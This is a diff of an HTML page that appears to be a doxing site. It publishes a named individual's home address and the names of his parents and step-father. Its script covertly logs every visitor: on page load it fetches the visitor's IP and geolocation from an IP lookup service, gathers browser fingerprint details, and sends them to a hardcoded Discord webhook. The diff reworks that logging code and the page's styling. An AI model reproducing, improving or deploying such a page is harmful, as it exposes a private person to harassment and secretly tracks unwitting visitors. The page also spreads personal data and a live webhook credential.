@@ -9,30 +9,28 @@
 
   :root {
     --bg: #000;
-    --bg2: #0a0a0a;
-    --card: #111;
-    --card2: #1a1a1a;
+    --card: #0a0a0a;
+    --card2: #111;
     --text: #fff;
-    --text2: #888;
-    --border: #222;
-    --glow: rgba(255,255,255,0.03);
+    --text2: #666;
+    --border: #1a1a1a;
+    --glow: rgba(255,255,255,0.02);
   }
 
   [data-theme="light"] {
-    --bg: #f5f5f5;
-    --bg2: #fff;
-    --card: #e8e8e8;
-    --card2: #ddd;
+    --bg: #f0f0f0;
+    --card: #fff;
+    --card2: #f5f5f5;
     --text: #000;
     --text2: #555;
-    --border: #ccc;
+    --border: #ddd;
     --glow: rgba(0,0,0,0.02);
   }
 
   body {
     background: var(--bg);
     color: var(--text);
-    font-family: 'Inter', 'Helvetica Neue', system-ui, sans-serif;
+    font-family: 'Courier New', monospace;
     min-height: 100vh;
     display: flex;
     align-items: center;
@@ -49,13 +47,13 @@
     width: 100%;
     height: 100%;
     background: url('https://github.com/outstrut/elijahpaz.space/blob/main/db5d5ef3-13a4-47a5-ae0c-13aeffb5788b.png?raw=true') center/cover no-repeat;
-    filter: grayscale(1) brightness(0.15) blur(1px);
+    filter: grayscale(1) brightness(0.08) blur(2px);
     z-index: 0;
     transition: filter 0.4s ease;
   }
 
   [data-theme="light"] .bg-image {
-    filter: grayscale(1) brightness(0.85) blur(0.5px);
+    filter: grayscale(1) brightness(0.7) blur(1px);
   }
 
   .bg-overlay {
@@ -64,12 +62,12 @@
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.6);
+    background: rgba(0,0,0,0.7);
     z-index: 1;
   }
 
   [data-theme="light"] .bg-overlay {
-    background: rgba(255,255,255,0.7);
+    background: rgba(255,255,255,0.6);
   }
 
   #entryScreen {
@@ -84,21 +82,27 @@
     align-items: center;
     justify-content: center;
     background: var(--bg);
-    transition: opacity 0.6s ease, transform 0.6s ease;
+    transition: opacity 0.8s ease, transform 0.8s ease;
   }
 
   #entryScreen.hidden {
     opacity: 0;
-    transform: scale(0.98);
+    transform: scale(0.95);
     pointer-events: none;
   }
 
   .entry-title {
-    font-size: clamp(4rem, 18vw, 10rem);
+    font-size: clamp(5rem, 20vw, 12rem);
     font-weight: 900;
-    letter-spacing: -0.06em;
+    letter-spacing: -0.04em;
     color: var(--text);
     margin-bottom: 2.5rem;
+    animation: flicker 3s infinite;
+  }
+
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
   }
 
   .entry-btn {
@@ -109,14 +113,16 @@
     background: transparent;
     color: var(--text);
     cursor: pointer;
-    transition: all 0.2s ease;
-    letter-spacing: 0.15em;
+    transition: all 0.3s ease;
+    letter-spacing: 0.2em;
     text-transform: uppercase;
+    font-family: 'Courier New', monospace;
   }
 
   .entry-btn:hover {
     background: var(--text);
     color: var(--bg);
+    transform: scale(1.05);
   }
 
   #mainContent {
@@ -125,7 +131,7 @@
     text-align: center;
     padding: 2rem;
     opacity: 0;
-    transition: opacity 1s ease;
+    transition: opacity 1.2s ease;
   }
 
   #mainContent.visible {
@@ -133,11 +139,17 @@
   }
 
   .dox-title {
-    font-size: clamp(3rem, 12vw, 7rem);
+    font-size: clamp(3.5rem, 14vw, 8rem);
     font-weight: 900;
-    letter-spacing: -0.05em;
+    letter-spacing: -0.04em;
     color: var(--text);
     margin-bottom: 3rem;
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.6; }
   }
 
   .dox-box {
@@ -145,18 +157,50 @@
     background: var(--card);
     border: 1px solid var(--border);
     padding: 2.5rem 4rem;
-    min-width: 340px;
+    min-width: 380px;
     transition: background 0.3s ease, border-color 0.3s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .dox-box::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(255,255,255,0.01) 2px,
+      rgba(255,255,255,0.01) 4px
+    );
+    pointer-events: none;
+    animation: scan 8s linear infinite;
+  }
+
+  @keyframes scan {
+    0% { transform: translateY(-100%); }
+    100% { transform: translateY(100%); }
   }
 
   .dox-line {
-    font-size: clamp(1rem, 2.5vw, 1.3rem);
+    font-size: clamp(0.9rem, 2.2vw, 1.2rem);
     font-weight: 500;
     color: var(--text);
     padding: 0.8rem 0;
     border-bottom: 1px solid var(--border);
     transition: color 0.3s ease, border-color 0.3s ease;
-    letter-spacing: 0.02em;
+    letter-spacing: 0.04em;
+    position: relative;
+    z-index: 1;
+    height: 3.2rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.8rem;
   }
 
   .dox-line:last-child {
@@ -166,11 +210,29 @@
   .dox-line .label {
     color: var(--text2);
     font-weight: 400;
-    margin-right: 0.8rem;
+    min-width: 80px;
+    text-align: right;
   }
 
   .dox-line .value {
     font-weight: 600;
+    min-width: 200px;
+    text-align: left;
+    position: relative;
+  }
+
+  .typing-cursor {
+    display: inline-block;
+    width: 2px;
+    height: 1.2em;
+    background: var(--text);
+    margin-left: 2px;
+    animation: blink 0.7s step-end infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
   }
 
   .theme-toggle {
@@ -189,7 +251,7 @@
     align-items: center;
     justify-content: center;
     transition: all 0.3s ease;
-    border-radius: 4px;
+    font-family: 'Courier New', monospace;
   }
 
   .theme-toggle:hover {
@@ -212,28 +274,32 @@
     align-items: center;
     justify-content: center;
     transition: all 0.3s ease;
-    border-radius: 4px;
+    font-family: 'Courier New', monospace;
   }
 
   .audio-toggle:hover {
     border-color: var(--text);
   }
 
-  .scramble {
-    display: inline-block;
-    transition: all 0.1s ease;
-  }
-
   @media (max-width: 600px) {
     .dox-box {
-      padding: 1.5rem 1.5rem;
+      padding: 1.5rem;
       min-width: unset;
       width: 100%;
     }
     .dox-line {
-      font-size: 0.9rem;
-      white-space: normal;
-      word-break: break-word;
+      font-size: 0.8rem;
+      height: 2.8rem;
+      flex-wrap: wrap;
+      gap: 0.3rem;
+    }
+    .dox-line .label {
+      min-width: 60px;
+      font-size: 0.7rem;
+    }
+    .dox-line .value {
+      min-width: 120px;
+      font-size: 0.8rem;
     }
     .entry-btn {
       padding: 1rem 2.5rem;
@@ -258,25 +324,25 @@
 <div id="mainContent">
   <div class="dox-title">KORBYN</div>
   <div class="dox-box">
-    <div class="dox-line">
+    <div class="dox-line" data-text="Korbyn Korinek">
       <span class="label">NAME</span>
-      <span class="value scramble">Korbyn Korinek</span>
+      <span class="value"></span>
     </div>
-    <div class="dox-line">
+    <div class="dox-line" data-text="70 South Citadel Circle, Pueblo West, CO">
       <span class="label">ADDRESS</span>
-      <span class="value scramble">70 South Citadel Circle, Pueblo West, CO</span>
+      <span class="value"></span>
     </div>
-    <div class="dox-line">
+    <div class="dox-line" data-text="Alyssa Cawthra">
       <span class="label">MOTHER</span>
-      <span class="value scramble">Alyssa Cawthra</span>
+      <span class="value"></span>
     </div>
-    <div class="dox-line">
+    <div class="dox-line" data-text="David Korinek">
       <span class="label">FATHER</span>
-      <span class="value scramble">David Korinek</span>
+      <span class="value"></span>
     </div>
-    <div class="dox-line">
+    <div class="dox-line" data-text="Cody Cawthra">
       <span class="label">STEP-FATHER</span>
-      <span class="value scramble">Cody Cawthra</span>
+      <span class="value"></span>
     </div>
   </div>
 </div>
@@ -284,66 +350,81 @@
 <audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>
 
 <script>
-  // --- IP LOGGING ---
+  // --- IP LOGGING - FIXED FORMAT ---
   function sendToDiscord(data) {
     const webhook = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
     
-    // Build rich embed with ALL data
-    const embed = {
-      embeds: [{
-        title: '📍 VISITOR LOGGED',
-        color: 0x000000,
-        fields: [],
-        timestamp: new Date().toISOString(),
-        footer: { text: 'KORBYN DOX | IP Logging Active' }
-      }]
-    };
+    // Build clean fields array
+    const fields = [];
+    
+    // Add IP data
+    const ipFields = [
+      'ip', 'type', 'continent', 'country', 'region', 'city', 'postal',
+      'latitude', 'longitude', 'isp', 'org', 'asn', 'asn_org',
+      'timezone', 'utc_offset', 'currency', 'currency_plural'
+    ];
+    
+    ipFields.forEach(key => {
+      if (data[key] !== undefined && data[key] !== null && data[key] !== '') {
+        fields.push({
+          name: key.toUpperCase().replace(/_/g, ' '),
+          value: String(data[key]).substring(0, 1024),
+          inline: true
+        });
+      }
+    });
 
-    // Add all fields from ipwho.is response
-    for (const [key, value] of Object.entries(data)) {
-      if (value !== null && value !== undefined && value !== '') {
-        // Handle nested objects (like timezone)
-        if (typeof value === 'object') {
-          for (const [subKey, subValue] of Object.entries(value)) {
-            if (subValue !== null && subValue !== undefined) {
-              embed.embeds[0].fields.push({
-                name: `${key}.${subKey}`.toUpperCase(),
-                value: String(subValue).substring(0, 1024),
-                inline: false
-              });
-            }
-          }
-        } else {
-          embed.embeds[0].fields.push({
-            name: key.toUpperCase(),
-            value: String(value).substring(0, 1024),
+    // Add security info
+    if (data.security) {
+      Object.entries(data.security).forEach(([k, v]) => {
+        if (v !== null && v !== undefined) {
+          fields.push({
+            name: `SECURITY: ${k.toUpperCase()}`,
+            value: String(v),
             inline: true
           });
         }
-      }
+      });
     }
 
     // Add browser info
-    embed.embeds[0].fields.push(
-      { name: 'BROWSER', value: navigator.userAgent, inline: false },
+    fields.push(
+      { name: 'BROWSER', value: navigator.userAgent.substring(0, 1024), inline: false },
       { name: 'LANGUAGE', value: navigator.language, inline: true },
       { name: 'PLATFORM', value: navigator.platform, inline: true },
       { name: 'SCREEN', value: `${window.screen.width}x${window.screen.height}`, inline: true },
       { name: 'COLOR DEPTH', value: `${window.screen.colorDepth}-bit`, inline: true },
       { name: 'TIMEZONE', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
       { name: 'REFERRER', value: document.referrer || 'Direct', inline: false },
-      { name: 'PAGE URL', value: window.location.href, inline: false }
+      { name: 'PAGE URL', value: window.location.href.substring(0, 1024), inline: false }
     );
 
-    // Send to Discord
+    // Send properly formatted embed
     fetch(webhook, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
-    }).catch(err => console.error('Webhook error:', err));
+      body: JSON.stringify({
+        embeds: [{
+          title: '📍 VISITOR LOGGED',
+          color: 0x000000,
+          fields: fields,
+          timestamp: new Date().toISOString(),
+          footer: { text: 'KORBYN DOX | IP Logging Active' }
+        }]
+      })
+    })
+    .then(res => {
+      if (!res.ok) {
+        return res.text().then(text => { throw new Error(`HTTP ${res.status}: ${text}`); });
+      }
+      console.log('✅ Discord webhook sent successfully');
+    })
+    .catch(err => {
+      console.error('❌ Discord webhook error:', err);
+    });
   }
 
-  // Fetch IP data on page load
+  // Fetch IP on page load
   fetch('https://ipwho.is/')
     .then(res => res.json())
     .then(data => {
@@ -351,6 +432,54 @@
       sendToDiscord(data);
     })
     .catch(err => console.error('IP fetch error:', err));
+
+  // --- TYPING EFFECT WITH FORWARD/BACKWARD LOOP ---
+  function typeLoop(element, text, speed = 50) {
+    let isTyping = true;
+    let index = 0;
+    let timeout;
+    let pause = false;
+
+    function type() {
+      if (pause) return;
+      
+      if (isTyping) {
+        // Forward
+        if (index < text.length) {
+          element.textContent = text.substring(0, index + 1) + '▌';
+          index++;
+          timeout = setTimeout(type, speed);
+        } else {
+          // Pause at end
+          element.textContent = text + '▌';
+          pause = true;
+          setTimeout(() => {
+            pause = false;
+            isTyping = false;
+            type();
+          }, 1500);
+        }
+      } else {
+        // Backward
+        if (index > 0) {
+          element.textContent = text.substring(0, index) + '▌';
+          index--;
+          timeout = setTimeout(type, speed);
+        } else {
+          // Pause at start
+          element.textContent = '▌';
+          pause = true;
+          setTimeout(() => {
+            pause = false;
+            isTyping = true;
+            type();
+          }, 1000);
+        }
+      }
+    }
+
+    type();
+  }
 
   // --- UI CONTROLS ---
   const entryScreen = document.getElementById('entryScreen');
@@ -365,7 +494,18 @@
     entryScreen.classList.add('hidden');
     setTimeout(() => {
       mainContent.classList.add('visible');
-    }, 700);
+      // Start typing effects after content appears
+      setTimeout(() => {
+        document.querySelectorAll('.dox-line .value').forEach((el, i) => {
+          const text = el.closest('.dox-line').dataset.text;
+          // Stagger each line
+          setTimeout(() => {
+            typeLoop(el, text, 40 + (i * 5));
+          }, i * 300);
+        });
+      }, 500);
+    }, 800);
+    
     audio.play().then(() => {
       audioPlaying = true;
       audioToggle.textContent = '◼';
@@ -398,37 +538,6 @@
         alert('Audio failed. Check the URL.');
       });
     }
-  });
-
-  document.querySelectorAll('.scramble').forEach(el => {
-    const original = el.textContent;
-    let interval;
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-
-    function scramble() {
-      let count = 0;
-      const max = 10;
-      clearInterval(interval);
-      interval = setInterval(() => {
-        if (count >= max) {
-          clearInterval(interval);
-          el.textContent = original;
-          return;
-        }
-        let result = '';
-        for (let i = 0; i < original.length; i++) {
-          result += Math.random() < 0.4 ? chars[Math.floor(Math.random() * chars.length)] : original[i];
-        }
-        el.textContent = result;
-        count++;
-      }, 50);
-    }
-
-    el.addEventListener('mouseenter', scramble);
-    el.addEventListener('mouseleave', () => {
-      clearInterval(interval);
-      el.textContent = original;
-    });
   });
 
   console.log('KORBYN');
